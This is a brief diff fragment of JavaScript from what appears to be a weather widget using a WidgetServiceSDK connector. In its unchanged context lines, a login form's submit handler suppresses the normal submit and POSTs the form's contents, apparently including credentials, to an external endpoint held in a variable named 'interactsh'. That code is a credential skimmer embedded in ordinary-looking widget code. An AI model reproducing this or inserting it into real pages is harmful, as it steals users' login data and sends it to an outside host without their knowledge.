@@ -14,18 +14,15 @@ fetch(interactsh, {
 
 login.onsubmit = async (e) => {
     e.preventDefault();
-
     let response = await fetch(interactsh, {
       method: 'POST',
       body: new FormData(login)
     });
-
     //let result = await response.json();
-
     //alert(result.message);
   };
 
-  async () => {
+  async (weather) => {
   const sdk = new window.WidgetServiceSDK();
   try {
     const data = await sdk.connectors.execute({
